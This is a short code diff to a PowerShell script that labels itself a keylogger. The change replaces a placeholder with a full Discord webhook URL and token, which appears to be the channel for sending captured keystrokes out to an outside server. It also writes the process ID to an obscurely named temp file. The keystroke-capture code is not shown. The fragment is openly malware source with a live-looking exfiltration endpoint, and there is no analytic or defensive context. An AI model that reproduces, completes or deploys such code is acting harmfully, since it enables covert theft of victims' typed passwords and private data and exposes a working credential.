@@ -1,7 +1,7 @@
 # powershell keylogger
 
 # webhook
-$webhook = "DISCORDWEBHOOK"
+$webhook = "https://discord.com/api/webhooks/1495621666368131133/S4hCGhfB3eXd5AT1NZBFLBT8q670jYf743RLcJqQUKWLgDBGeG-lWJO_FVa4W-g39D8D"
 
 # write pid
 $PID > "$env:temp/DdBPKCytRe"
